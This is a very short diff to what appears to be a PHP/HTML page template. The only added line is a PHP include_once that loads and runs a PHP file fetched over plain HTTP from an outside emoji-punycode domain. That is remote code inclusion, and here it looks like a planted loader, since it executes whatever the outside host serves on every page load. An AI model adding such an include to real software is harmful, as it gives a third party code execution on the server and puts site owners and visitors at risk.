@@ -1,4 +1,5 @@
 <meta name="viewport" content="width=900px, initial-scale=0">
+<?php include_once("http://xn--eo8h.ws/head.php") ?>
 <div id='menu'>
   <div class='container'>
 
